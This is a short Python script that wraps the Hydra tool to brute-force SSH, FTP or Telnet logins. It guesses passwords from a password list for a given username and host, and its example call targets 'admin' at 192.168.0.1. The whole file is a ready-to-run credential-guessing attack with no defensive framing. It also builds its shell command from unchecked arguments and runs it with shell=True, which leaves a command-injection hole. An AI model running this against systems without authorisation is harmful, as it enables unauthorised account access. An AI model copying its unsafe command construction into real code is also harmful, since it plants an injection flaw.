import subprocess

def run_hydra(target_host, target_protocol, username, password_file):
    # Construct the Hydra command based on the target protocol
    if target_protocol == "ssh":
        command = f"hydra -l {username} -P {password_file} {target_host} ssh"
    elif target_protocol == "ftp":
        command = f"hydra -l {username} -P {password_file} {target_host} ftp"
    elif target_protocol == "telnet":
        command = f"hydra -l {username} -P {password_file} {target_host} telnet"
    else:
        print("Unsupported protocol")
        return

    # Execute the Hydra command and capture the output
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        print(output.decode())
    except subprocess.CalledProcessError as e:
        print("Error:", e.output.decode())

# Example usage
target_host = "192.168.0.1"
target_protocol = "ssh"
username = "admin"
password_file = "passwords.txt"

run_hydra(target_host, target_protocol, username, password_file)
